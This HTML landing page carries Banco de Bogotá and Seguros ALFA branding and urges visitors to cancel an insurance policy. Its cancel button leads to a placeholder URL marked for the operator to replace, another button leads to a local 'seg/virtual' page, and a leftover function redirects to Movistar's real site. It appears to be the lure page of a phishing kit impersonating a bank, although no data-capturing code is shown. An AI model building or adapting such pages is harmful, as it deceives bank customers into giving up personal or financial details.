<!DOCTYPE html>
<html lang="es-CO">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="description" content="Inicia la cancelación de tu seguro ALFA con el respaldo del Banco de Bogotá. Atención, beneficios y soporte en un solo lugar." />
  <link rel="icon" href="seg/virtual/img/favicon.ico" type="image/x-icon" />
  <title>Seguros Alfa | Banco Bogotá</title>

  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap" rel="stylesheet" />
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js" defer></script>

  <style>
    /* estilos originales (sin cambios) */
    :root{
      --brand:#180adf; --brand-ink:#0f0a7a; --accent:#00ccea;
      --bg:#F7F7F7; --card:#ffffff; --text:#1f2937; --muted:#667085;
      --radius:14px; --shadow:0 10px 30px rgba(2, 8, 20, .06);
      --shadow-soft:0 0 12px 1px rgba(57,62,100,.1);
    }
    *{box-sizing:border-box;margin:0;padding:0}
    html{scroll-behavior:smooth}
    body{font-family:"Open Sans",system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial,"Noto Sans";
         background:var(--bg); color:var(--text); -webkit-font-smoothing:antialiased; text-rendering:optimizeLegibility;}
    img{max-width:100%;height:auto}
    /* ... resto de estilos sin tocar ... */
  </style>
</head>

<body>
  <!-- contenido original sin cambios -->
  <header id="cabecera" role="banner" aria-label="Cabecera">
    <!-- ... -->
  </header>

  <main>
    <!-- HERO -->
    <table id="tbl-baner" class="fade-in">
      <tr>
        <td valign="middle">
          <div class="titulo-baner">Inicia el proceso de cancelación de seguros <strong>ALFA</strong></div>
          <br />
          <div class="contenido">
            Accede a los servicios que Banco de Bogotá y Seguros ALFA te ofrecen para tu seguridad y tranquilidad.
            <br /><br />
            Disfruta todos los <strong>beneficios adicionales</strong> a tus coberturas y dale seguridad a tu
            desarrollo <strong>personal y profesional</strong>.
          </div>
          <br />
          <button class="btn" id="btn-cancelar" aria-label="Cancelar seguro">CANCELAR SEGURO</button>
        </td>
        <td valign="middle" class="quitar1"></td>
      </tr>
    </table>

    <!-- resto del contenido igual -->
  </main>

  <footer role="contentinfo" aria-label="Pie de página">
    <!-- ... -->
  </footer>

  <script>
    // Redirección CTA (se conserva por compatibilidad)
    function final(){ window.location.href = "https://www.movistar.com.co/"; }

    document.addEventListener("DOMContentLoaded", function(){

      // 🔹 SOLO #btn-registrate mantiene la redirección original
      $("#btn-registrate").on("click", function(){
        window.location.href = "seg/virtual/index.html";
      });

      // 🔹 NUEVA redirección para #btn-cancelar
      $("#btn-cancelar").on("click", function(){
        window.location.href = "https://www.ejemplo.com"; // 👉 cámbiala por tu URL
      });

      // Reveal animado
      const io = new IntersectionObserver((entries) => {
        entries.forEach(e => { if(e.isIntersecting) e.target.classList.add("is-visible"); });
      }, {threshold:.18});
      document.querySelectorAll(".fade-in").forEach(el => io.observe(el));

      // Fallback universal de imágenes
      const FALLBACK = 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="420" height="280"><rect width="100%" height="100%" fill="%23f2f4f7"/><text x="50%" y="50%" dominant-baseline="middle" text-anchor="middle" font-family="Arial" font-size="14" fill="%239aa4b2">Imagen no disponible</text></svg>';
      document.querySelectorAll("img").forEach(img=>{
        img.addEventListener("error", ()=>{ 
          img.src = FALLBACK; 
          img.style.background="#f7f7f9"; 
          img.style.objectFit="contain"; 
        });
      });
    });
  </script>
</body>
</html>
